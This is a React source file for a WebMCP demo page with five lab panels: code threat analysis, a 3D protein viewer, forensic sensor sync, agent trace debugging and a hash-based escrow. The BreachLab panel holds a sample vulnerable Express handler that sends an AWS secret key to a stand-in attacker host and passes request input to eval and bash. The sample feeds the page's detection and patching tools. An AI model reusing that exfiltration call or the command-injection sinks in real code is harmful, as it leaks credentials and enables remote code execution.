"use client";

/**
 * The WebMCP OMNI-LAB — five in-browser laboratories, twenty registered tools.
 *
 * Every button invokes a real tool through `document.modelContext` (polyfilled
 * when the browser does not ship it) and prints the actual result. The escrow
 * and forensic modules use real SHA-256 / HMAC-SHA-256 digests.
 */
import { useCallback, useEffect, useRef, useState } from "react";
import { Btn, Tilt } from "@/components/interactive";
import { webmcp, BioSynth, ChronoForensic } from "@/lib/webmcp";
import type { ConsoleContext } from "@/app/app/page";

type LabId = "breach" | "bio" | "chrono" | "meta" | "zk";

const LABS: { id: LabId; name: string; tag: string; blurb: string }[] = [
  { id: "breach", name: "BreachLab", tag: "AST triage", blurb: "Static analysis: taint tracing, RCE sinks, sandbox detonation, hotpatch synthesis." },
  { id: "bio", name: "BioSynth", tag: "3D protein CAD", blurb: "Crambin 1CRN coordinates, point mutagenesis with ΔΔG, binding-pocket discovery." },
  { id: "chrono", name: "ChronoForensic", tag: "OSINT", blurb: "Multi-angle sensor sync, acoustic TDOA triangulation, sealed forensic dossier." },
  { id: "meta", name: "MetaLoop", tag: "swarm debugger", blurb: "Trace-tree inspection, synthetic tool injection, cognitive-drift compensation." },
  { id: "zk", name: "ZK Escrow", tag: "arbiter", blurb: "Real SHA-256 / HMAC-SHA-256 escrow with milestone-gated release proofs." },
];

const SAMPLE_ZERO_DAY = `const express = require('express');
const { execSync } = require('child_process');

app.post('/api/webhook', (req, res) => {
  const payload = req.query.cmd;
  const token = process.env.AWS_SECRET_ACCESS_KEY;
  fetch("https://evil-cve-stealer.internal/leak?k=" + token);
  const result = eval(payload);
  execSync("bash -c '" + req.body.script + "'");
});`;

interface ConsoleLine {
  id: number;
  tool: string;
  ok: boolean;
  payload: unknown;
  at: number;
}

let lineId = 0;

function JsonView({ data }: { data: unknown }) {
  return (
    <div className="code-block" style={{ marginTop: 8 }}>
      <pre>{JSON.stringify(data, null, 2)}</pre>
    </div>
  );
}

function ToolConsole({ lines }: { lines: ConsoleLine[] }) {
  const ref = useRef<HTMLDivElement>(null);
  useEffect(() => {
    if (ref.current !== null) ref.current.scrollTop = ref.current.scrollHeight;
  }, [lines]);
  return (
    <div className="term" ref={ref} style={{ minHeight: 180, maxHeight: 360, overflowY: "auto" }}>
      {lines.length === 0 ? (
        <div className="term-line">
          <span className="who">omni-lab</span>
          <span className="term-narration">Every action here invokes a registered WebMCP tool and prints its real result.</span>
        </div>
      ) : (
        lines.map((line) => (
          <div key={line.id} style={{ marginBottom: 12 }}>
            <div className="term-line">
              <span className="who">{new Date(line.at).toLocaleTimeString("en-GB", { hour12: false })}</span>
              <span className="term-tool mono" style={{ fontSize: 12 }}>
                {line.ok ? "✓" : "✕"} {line.tool}
              </span>
            </div>
            <JsonView data={line.payload} />
          </div>
        ))
      )}
    </div>
  );
}

/* ============================================================ BioSynth 3D */

interface Atom {
  x: number; y: number; z: number; element: string;
}

function ProteinCanvas({ atoms, mutationSite }: { atoms: Atom[]; mutationSite: number | null }) {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const stateRef = useRef({ rotationX: 0.4, rotationY: 0, dragging: false, lastX: 0, lastY: 0, zoom: 1 });

  useEffect(() => {
    const canvas = canvasRef.current;
    if (canvas === null) return;
    const context = canvas.getContext("2d");
    if (context === null) return;

    let frame = 0;
    let width = 0;
    let height = 0;
    const resize = () => {
      const rect = canvas.getBoundingClientRect();
      const dpr = Math.min(window.devicePixelRatio || 1, 2);
      width = rect.width;
      height = rect.height;
      canvas.width = Math.round(width * dpr);
      canvas.height = Math.round(height * dpr);
      context.setTransform(dpr, 0, 0, dpr, 0, 0);
    };
    resize();
    const observer = new ResizeObserver(resize);
    observer.observe(canvas);

    const render = () => {
      frame = requestAnimationFrame(render);
      const state = stateRef.current;
      if (!state.dragging) state.rotationY += 0.006;
      context.clearRect(0, 0, width, height);

      if (atoms.length === 0) {
        context.fillStyle = "rgba(255,255,255,0.25)";
        context.font = "12px monospace";
        context.fillText("load a structure to render", width / 2 - 92, height / 2);
        return;
      }

      // centre of mass
      let cx = 0, cy = 0, cz = 0;
      for (const atom of atoms) { cx += atom.x; cy += atom.y; cz += atom.z; }
      cx /= atoms.length; cy /= atoms.length; cz /= atoms.length;

      const cosX = Math.cos(state.rotationX);
      const sinX = Math.sin(state.rotationX);
      const cosY = Math.cos(state.rotationY);
      const sinY = Math.sin(state.rotationY);
      const scale = Math.min(width, height) / 44 * state.zoom;

      const projected = atoms
        .map((atom, index) => {
          const px0 = atom.x - cx;
          const py0 = atom.y - cy;
          const pz0 = atom.z - cz;
          const x1 = px0 * cosY - pz0 * sinY;
          const z1 = px0 * sinY + pz0 * cosY;
          const y2 = py0 * cosX - z1 * sinX;
          const z2 = py0 * sinX + z1 * cosX;
          const perspective = 60 / (60 + z2);
          return {
            x: width / 2 + x1 * scale * perspective,
            y: height / 2 + y2 * scale * perspective,
            depth: z2,
            index,
          };
        })
        .sort((a, b) => b.depth - a.depth);

      for (const point of projected) {
        const alpha = Math.max(0.12, 0.9 - point.depth / 30);
        const isMutation = mutationSite !== null && point.index === mutationSite;
        const radius = isMutation ? 7 : Math.max(1.4, 4 - point.depth / 12);
        context.beginPath();
        context.arc(point.x, point.y, radius, 0, Math.PI * 2);
        context.fillStyle = isMutation ? "#fff" : `rgba(255,255,255,${alpha})`;
        if (isMutation) {
          context.shadowColor = "rgba(255,255,255,1)";
          context.shadowBlur = 22;
        } else {
          context.shadowColor = `rgba(255,255,255,${alpha * 0.6})`;
          context.shadowBlur = radius * 2.2;
        }
        context.fill();
        context.shadowBlur = 0;
      }
    };
    render();

    const onDown = (event: PointerEvent) => {
      stateRef.current.dragging = true;
      stateRef.current.lastX = event.clientX;
      stateRef.current.lastY = event.clientY;
      canvas.setPointerCapture(event.pointerId);
    };
    const onMove = (event: PointerEvent) => {
      const state = stateRef.current;
      if (!state.dragging) return;
      state.rotationY += (event.clientX - state.lastX) * 0.008;
      state.rotationX += (event.clientY - state.lastY) * 0.008;
      state.lastX = event.clientX;
      state.lastY = event.clientY;
    };
    const onUp = () => { stateRef.current.dragging = false; };
    const onWheel = (event: WheelEvent) => {
      event.preventDefault();
      stateRef.current.zoom = Math.max(0.5, Math.min(2.4, stateRef.current.zoom - event.deltaY * 0.0014));
    };
    canvas.addEventListener("pointerdown", onDown);
    canvas.addEventListener("pointermove", onMove);
    canvas.addEventListener("pointerup", onUp);
    canvas.addEventListener("wheel", onWheel, { passive: false });
    return () => {
      cancelAnimationFrame(frame);
      observer.disconnect();
      canvas.removeEventListener("pointerdown", onDown);
      canvas.removeEventListener("pointermove", onMove);
      canvas.removeEventListener("pointerup", onUp);
      canvas.removeEventListener("wheel", onWheel);
    };
  }, [atoms, mutationSite]);

  return (
    <canvas
      ref={canvasRef}
      style={{ width: "100%", height: 300, display: "block", touchAction: "none", cursor: "grab", background: "radial-gradient(circle at 50% 45%, rgba(255,255,255,0.05), transparent 70%), #050506", borderRadius: 12, border: "1px solid var(--line)" }}
      aria-label="3D protein structure — drag to rotate"
    />
  );
}

/* ================================================================== LABS */

export default function Labs({ context }: { context: ConsoleContext }) {
  const { webmcp: webmcpInfo, push } = context;
  const [lab, setLab] = useState<LabId>("breach");
  const [lines, setLines] = useState<ConsoleLine[]>([]);
  const [busy, setBusy] = useState<string | null>(null);

  // BreachLab state
  const [code, setCode] = useState(SAMPLE_ZERO_DAY);
  const [threat, setThreat] = useState<{ threatScore: number; verdict: string; findings: unknown[] } | null>(null);

  // BioSynth state
  const [atoms, setAtoms] = useState<Atom[]>([]);
  const [mutationSite, setMutationSite] = useState<number | null>(null);
  const [residue, setResidue] = useState("2");
  const [target, setTarget] = useState("TRP");

  // Chrono state
  const [feeds, setFeeds] = useState<typeof ChronoForensic.DEMO_FEEDS>([]);

  // MetaLoop state
  const [anomalies, setAnomalies] = useState<unknown[] | null>(null);

  // ZK state
  const [contractor, setContractor] = useState("Ada Lovelace");
  const [client, setClient] = useState("Charles Babbage");
  const [contract, setContract] = useState<unknown>(null);
  const [deliverable, setDeliverable] = useState("function calc(a,b){ return a+b; } // milestone 1 deliverable");

  const runTool = useCallback(
    async (name: string, args: Record<string, unknown>, after?: (result: unknown) => void) => {
      setBusy(name);
      try {
        const result = await webmcp.invoke(name, args);
        lineId += 1;
        setLines((current) => [...current, { id: lineId, tool: name, ok: true, payload: result, at: Date.now() }]);
        after?.(result);
      } catch (cause) {
        lineId += 1;
        setLines((current) => [
          ...current,
          { id: lineId, tool: name, ok: false, payload: { error: cause instanceof Error ? cause.message : String(cause) }, at: Date.now() },
        ]);
        push(`${name} failed — see the console.`, "warn");
      } finally {
        setBusy(null);
      }
    },
    [push],
  );

  const switchLab = (next: LabId) => {
    setLab(next);
    setLines([]);
    setThreat(null);
    setAnomalies(null);
  };

  const loadProtein = useCallback(() => {
    const parsed = BioSynth.parsePDB(BioSynth.SAMPLE_PDB_1CRN);
    setAtoms(parsed.atoms as Atom[]);
    setMutationSite(null);
    return parsed;
  }, []);

  return (
    <div>
      {/* lab selector */}
      <div className="row" style={{ gap: 12, marginBottom: 22 }}>
        {LABS.map((item) => (
          <button
            key={item.id}
            onClick={() => switchLab(item.id)}
            className="panel"
            data-active={lab === item.id}
            style={{
              padding: "16px 20px",
              cursor: "pointer",
              textAlign: "left",
              flex: "1 1 200px",
              borderColor: lab === item.id ? "rgba(255,255,255,0.55)" : "var(--line)",
              background: lab === item.id ? "rgba(255,255,255,0.07)" : undefined,
              boxShadow: lab === item.id ? "0 0 34px -6px rgba(255,255,255,0.25)" : undefined,
              transition: "all 0.3s",
              color: "inherit",
            }}
          >
            <div className="row" style={{ justifyContent: "space-between", alignItems: "center" }}>
              <strong className="display" style={{ fontSize: 15 }}>{item.name}</strong>
              <span className="chip" style={{ fontSize: 9 }}>{item.tag}</span>
            </div>
            <p className="faint small" style={{ margin: "8px 0 0", lineHeight: 1.55 }}>{item.blurb}</p>
          </button>
        ))}
      </div>

      {webmcpInfo !== null && (
        <p className="faint small" style={{ margin: "0 0 18px" }}>
          {webmcpInfo.registeredCount} tools registered on document.modelContext{" "}
          {webmcpInfo.polyfilled ? "(W3C/OpenAI polyfill active)" : "(native browser implementation)"} — a real WebMCP
          agent calls the same registry this page uses.
        </p>
      )}

      {/* ============================================== BREACHLAB */}
      {lab === "breach" && (
        <div className="grid-2" style={{ gridTemplateColumns: "minmax(300px, 5fr) minmax(280px, 4fr)" }}>
          <div className="panel brackets" style={{ padding: 22 }}>
            <h3 className="display" style={{ fontSize: 17, margin: "0 0 12px" }}>Target code</h3>
            <textarea
              className="textarea mono"
              style={{ minHeight: 220, fontSize: 12 }}
              value={code}
              onChange={(event) => setCode(event.target.value)}
              spellCheck={false}
            />
            <div className="row" style={{ margin: "16px 0 0" }}>
              <Btn onClick={() => runTool("breachlab_analyze_cve_ast", { codeOrManifest: code, checkSupplyChain: true },
                (result) => setThreat(result as { threatScore: number; verdict: string; findings: unknown[] }))}
                disabled={busy !== null}>
                {busy === "breachlab_analyze_cve_ast" ? "Analyzing…" : "Analyze AST"}
              </Btn>
              <Btn variant="ghost" onClick={() => runTool("breachlab_trace_taint_flow", { code })} disabled={busy !== null}>
                Trace taint
              </Btn>
              <Btn variant="ghost" onClick={() => runTool("breachlab_detonate_sandbox", { code })} disabled={busy !== null}>
                Detonate
              </Btn>
              <Btn variant="ghost" onClick={() => runTool("breachlab_generate_hotpatch", { code })} disabled={busy !== null}>
                Hotpatch
              </Btn>
            </div>
          </div>
          <div className="panel" style={{ padding: 22 }}>
            <h3 className="display" style={{ fontSize: 17, margin: "0 0 14px" }}>Threat assessment</h3>
            {threat === null ? (
              <p className="faint small">Run the AST analysis to populate the assessment.</p>
            ) : (
              <>
                <div className="row" style={{ justifyContent: "space-between", alignItems: "baseline" }}>
                  <span className="display chrome-text" style={{ fontSize: 42, fontWeight: 700 }}>{threat.threatScore}</span>
                  <span className="sev sev-critical">{String(threat.verdict)}</span>
                </div>
                <div className="meter" style={{ margin: "12px 0" }}>
                  <i style={{ width: `${Math.min(100, Number(threat.threatScore))}%` }} />
                </div>
                <p className="muted small" style={{ margin: 0 }}>
                  {Array.isArray(threat.findings) ? threat.findings.length : 0} finding(s) — details in the console output.
                </p>
              </>
            )}
          </div>
          <div style={{ gridColumn: "1 / -1" }}>
            <ToolConsole lines={lines} />
          </div>
        </div>
      )}

      {/* ============================================== BIOSYNTH */}
      {lab === "bio" && (
        <div className="grid-2" style={{ gridTemplateColumns: "minmax(300px, 5fr) minmax(280px, 4fr)" }}>
          <div className="panel brackets" style={{ padding: 22 }}>
            <div className="row" style={{ justifyContent: "space-between", alignItems: "center", marginBottom: 12 }}>
              <h3 className="display" style={{ fontSize: 17, margin: 0 }}>3D atomic structure — 1CRN Crambin</h3>
              <span className="chip">drag to rotate · wheel to zoom</span>
            </div>
            <ProteinCanvas atoms={atoms} mutationSite={mutationSite} />
            <div className="row" style={{ margin: "16px 0 0" }}>
              <Btn onClick={() => runTool("biosynth_load_pdb_structure", {}, (result) => {
                const parsed = result as { atoms: Atom[] };
                setAtoms(parsed.atoms);
                setMutationSite(null);
              })} disabled={busy !== null}>
                {busy === "biosynth_load_pdb_structure" ? "Loading…" : "Load structure"}
              </Btn>
              <Btn variant="ghost" onClick={() => runTool("biosynth_highlight_binding_pockets", {})} disabled={busy !== null}>
                Scan pockets
              </Btn>
            </div>
          </div>
          <div className="panel" style={{ padding: 22 }}>
            <h3 className="display" style={{ fontSize: 17, margin: "0 0 12px" }}>Point mutagenesis</h3>
            <div className="row" style={{ gap: 10, alignItems: "flex-end" }}>
              <div className="field grow">
                <label>Residue seq</label>
                <input className="input" value={residue} onChange={(event) => setResidue(event.target.value)} />
              </div>
              <div className="field grow">
                <label>Mutate to</label>
                <select className="select" value={target} onChange={(event) => setTarget(event.target.value)}>
                  {["ALA", "ARG", "ASN", "ASP", "CYS", "GLN", "GLU", "GLY", "HIS", "ILE", "LEU", "LYS", "MET", "PHE", "PRO", "SER", "THR", "TRP", "TYR", "VAL"].map((code3) => (
                    <option key={code3} value={code3}>{code3}</option>
                  ))}
                </select>
              </div>
            </div>
            <Btn style={{ marginTop: 16 }} onClick={() => runTool("biosynth_mutate_residue", { chain: "A", resSeq: Number(residue) || 2, targetResidue3: target }, () => {
              // highlight an atom near the mutated residue
              const parsed = BioSynth.parsePDB(BioSynth.SAMPLE_PDB_1CRN);
              const site = (parsed.atoms as (Atom & { resSeq?: number })[]).findIndex((atom) => atom.resSeq === (Number(residue) || 2));
              setAtoms(parsed.atoms as Atom[]);
              setMutationSite(site >= 0 ? site : null);
            })} disabled={busy !== null}>
              {busy === "biosynth_mutate_residue" ? "Simulating…" : `Mutate A/${residue} → ${target}`}
            </Btn>
            <p className="faint small" style={{ margin: "14px 0 0", lineHeight: 1.7 }}>
              The mutation reports ΔΔG (kcal/mol), a stability verdict and steric clashes. The highlighted atom marks
              the mutation site in the viewer.
            </p>
          </div>
          <div style={{ gridColumn: "1 / -1" }}>
            <ToolConsole lines={lines} />
          </div>
        </div>
      )}

      {/* ================================================ CHRONO */}
      {lab === "chrono" && (
        <div className="grid-2" style={{ gridTemplateColumns: "minmax(300px, 5fr) minmax(280px, 4fr)" }}>
          <div className="panel brackets" style={{ padding: 22 }}>
            <h3 className="display" style={{ fontSize: 17, margin: "0 0 12px" }}>Multi-angle sensor streams</h3>
            {feeds.length === 0 ? (
              <p className="faint small">No streams loaded. Retrieve the demo feeds to begin reconstruction.</p>
            ) : (
              <div className="grid-3" style={{ gap: 12 }}>
                {feeds.map((feed: { id: string; cameraType: string; geoPosition: { x: number; y: number; z: number }; acousticEvents: { timestampSec: number }[] }) => (
                  <div key={feed.id} className="panel" style={{ padding: 14 }}>
                    <div className="row" style={{ justifyContent: "space-between" }}>
                      <strong className="mono small">{feed.id}</strong>
                      <span className="chip" style={{ fontSize: 9 }}>{feed.cameraType}</span>
                    </div>
                    <div className="mono faint" style={{ fontSize: 10.5, marginTop: 8, lineHeight: 1.7 }}>
                      pos ({feed.geoPosition.x}, {feed.geoPosition.y}, {feed.geoPosition.z})
                      <br />
                      first acoustic event t={feed.acousticEvents[0]?.timestampSec ?? "—"}s
                    </div>
                  </div>
                ))}
              </div>
            )}
            <div className="row" style={{ margin: "16px 0 0" }}>
              <Btn onClick={() => runTool("chrono_load_media_streams", {}, (result) => setFeeds(result as typeof ChronoForensic.DEMO_FEEDS))} disabled={busy !== null}>
                {busy === "chrono_load_media_streams" ? "Retrieving…" : "Load streams"}
              </Btn>
              <Btn variant="ghost" onClick={() => runTool("chrono_sync_flash_audio_markers", { referenceFeedId: feeds[0]?.id ?? "cam-north", targetFeedId: feeds[1]?.id ?? "cam-east" })} disabled={busy !== null}>
                Sync flash markers
              </Btn>
              <Btn variant="ghost" onClick={() => runTool("chrono_triangulate_acoustic_source", {})} disabled={busy !== null}>
                Triangulate origin
              </Btn>
              <Btn variant="ghost" onClick={() => runTool("chrono_generate_forensic_dossier", { incidentId: "INC-2026-0830" })} disabled={busy !== null}>
                Seal dossier
              </Btn>
            </div>
          </div>
          <div className="panel" style={{ padding: 22 }}>
            <h3 className="display" style={{ fontSize: 17, margin: "0 0 12px" }}>Reconstruction protocol</h3>
            <ol className="muted small" style={{ margin: 0, paddingLeft: 18, lineHeight: 2 }}>
              <li>Retrieve the CCTV, bodycam and drone feeds.</li>
              <li>Cross-correlate optical flash peaks against acoustic transients for millisecond offsets.</li>
              <li>Triangulate the 3D origin via time-difference-of-arrival.</li>
              <li>Seal the dossier with a SHA-256 evidence hash.</li>
            </ol>
            <p className="faint small" style={{ lineHeight: 1.7, marginTop: 14 }}>
              Evidence hashes are real SHA-256 digests computed in your browser — verify them in any terminal.
            </p>
          </div>
          <div style={{ gridColumn: "1 / -1" }}>
            <ToolConsole lines={lines} />
          </div>
        </div>
      )}

      {/* ================================================= META */}
      {lab === "meta" && (
        <div className="grid-2" style={{ gridTemplateColumns: "minmax(300px, 5fr) minmax(280px, 4fr)" }}>
          <div className="panel brackets" style={{ padding: 22 }}>
            <h3 className="display" style={{ fontSize: 17, margin: "0 0 12px" }}>Swarm flight recorder</h3>
            {anomalies === null ? (
              <p className="faint small">Inspect the trace tree to surface infinite loops, token spikes and drift.</p>
            ) : (
              <div className="grid-3" style={{ gap: 12 }}>
                {(anomalies as { type: string; description: string; severity?: string }[]).map((anomaly, index) => (
                  <div key={index} className="panel" style={{ padding: 14 }}>
                    <span className="sev sev-high" style={{ fontSize: 9 }}>{anomaly.type}</span>
                    <p className="muted small" style={{ margin: "8px 0 0", lineHeight: 1.6 }}>{anomaly.description}</p>
                  </div>
                ))}
              </div>
            )}
            <div className="row" style={{ margin: "16px 0 0" }}>
              <Btn onClick={() => runTool("metaloop_inspect_trace_tree", {}, (result) => setAnomalies((result as { anomalies: unknown[] }).anomalies))} disabled={busy !== null}>
                {busy === "metaloop_inspect_trace_tree" ? "Inspecting…" : "Inspect trace tree"}
              </Btn>
              <Btn variant="ghost" onClick={() => runTool("metaloop_inject_synthetic_tool", {
                forkPointStepId: "step-04",
                syntheticToolName: "http_fetch",
                syntheticOutput: { status: 200, body: "synthetic response injected by MetaLoop" },
              })} disabled={busy !== null}>
                Inject synthetic tool
              </Btn>
              <Btn variant="ghost" onClick={() => runTool("metaloop_mitigate_drift", {})} disabled={busy !== null}>
                Mitigate drift
              </Btn>
            </div>
          </div>
          <div className="panel" style={{ padding: 22 }}>
            <h3 className="display" style={{ fontSize: 17, margin: "0 0 12px" }}>Cognitive compensator</h3>
            <p className="muted small" style={{ lineHeight: 1.75 }}>
              Agent swarms degrade in recognisable ways: tool loops that never terminate, token budgets that spike
              on repeated context, and answers that drift from the mission. MetaLoop detects the pattern, forks the
              trace at the trap point, and synthesises steering guidance.
            </p>
          </div>
          <div style={{ gridColumn: "1 / -1" }}>
            <ToolConsole lines={lines} />
          </div>
        </div>
      )}

      {/* ==================================================== ZK */}
      {lab === "zk" && (
        <div className="grid-2" style={{ gridTemplateColumns: "minmax(300px, 5fr) minmax(280px, 4fr)" }}>
          <div className="panel brackets" style={{ padding: 22 }}>
            <h3 className="display" style={{ fontSize: 17, margin: "0 0 12px" }}>Cryptographic escrow contract</h3>
            <div className="row" style={{ gap: 12 }}>
              <div className="field grow">
                <label>Contractor</label>
                <input className="input" value={contractor} onChange={(event) => setContractor(event.target.value)} />
              </div>
              <div className="field grow">
                <label>Client</label>
                <input className="input" value={client} onChange={(event) => setClient(event.target.value)} />
              </div>
            </div>
            <div className="row" style={{ margin: "16px 0 0" }}>
              <Btn onClick={() => runTool("zkescrow_initiate_contract", { contractorName: contractor, clientName: client }, (result) => setContract(result))} disabled={busy !== null}>
                {busy === "zkescrow_initiate_contract" ? "Drafting…" : "Initiate contract"}
              </Btn>
              <Btn variant="ghost" onClick={() => runTool("zkescrow_verify_deliverable_hash", { milestoneId: "m1-core-implementation", submittedContent: deliverable })} disabled={busy !== null}>
                Verify deliverable
              </Btn>
              <Btn variant="ghost" onClick={() => runTool("zkescrow_sign_escrow_release", { milestoneId: "m1-core-implementation" })} disabled={busy !== null}>
                Sign release
              </Btn>
            </div>
            <div className="field" style={{ marginTop: 18 }}>
              <label>Submitted deliverable (hashed for verification)</label>
              <textarea className="textarea mono" style={{ minHeight: 90, fontSize: 12 }} value={deliverable} onChange={(event) => setDeliverable(event.target.value)} spellCheck={false} />
            </div>
          </div>
          <div className="panel" style={{ padding: 22 }}>
            <h3 className="display" style={{ fontSize: 17, margin: "0 0 12px" }}>Arbiter rules</h3>
            <ul className="muted small" style={{ margin: 0, paddingLeft: 18, lineHeight: 2 }}>
              <li>Deliverable fingerprints are real SHA-256 digests.</li>
              <li>A milestone must be <strong style={{ color: "#fff" }}>verified</strong> before escrow release.</li>
              <li>Release proofs are HMAC-SHA-256 under the arbiter key.</li>
              <li>No backend, no escrow holder — the mathematics holds the funds.</li>
            </ul>
            {contract !== null && (
              <p className="faint small" style={{ marginTop: 14 }}>Contract drafted — see the console for the milestone schedule and contract hash.</p>
            )}
          </div>
          <div style={{ gridColumn: "1 / -1" }}>
            <ToolConsole lines={lines} />
          </div>
        </div>
      )}
    </div>
  );
}
